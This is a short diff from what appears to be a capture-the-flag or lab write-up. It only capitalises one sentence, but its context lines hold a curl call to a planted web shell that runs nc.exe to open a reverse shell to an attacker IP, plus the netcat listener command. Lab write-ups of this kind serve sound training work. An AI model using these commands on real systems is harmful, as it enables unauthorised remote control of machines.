@@ -193,7 +193,7 @@ The output shows that we successfully achieved code execution as the `nt authori
 curl http://10.129.14.62/shell.php?cmd=c:\\programdata\\nc.exe+-e+cmd.exe+10.10.16.121+6666
 ```
 
-don't forget to replace the target and localhost IP address and make sure your listener is up.
+Don't forget to replace the target and localhost IP address and make sure your listener is up.
 
 ```bash
 nc -lvnp 6666   
